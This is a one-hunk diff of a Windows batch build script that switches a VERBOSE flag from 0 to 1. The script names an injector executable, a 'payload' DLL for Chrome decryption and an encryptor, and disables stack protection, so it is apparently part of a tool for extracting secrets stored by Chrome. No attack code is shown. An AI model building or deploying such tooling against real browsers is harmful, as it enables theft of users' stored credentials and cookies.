@@ -8,7 +8,7 @@ set "BUILD_DIR=build"
 set "FINAL_EXE_NAME=chrome_inject.exe"
 set "PAYLOAD_DLL_NAME=chrome_decrypt.dll"
 set "ENCRYPTOR_EXE_NAME=encryptor.exe"
-set "VERBOSE=0"
+set "VERBOSE=1"
 
 :: Compiler and Linker Flags
 set "CFLAGS_COMMON=/nologo /W3 /O2 /MT /GS-"
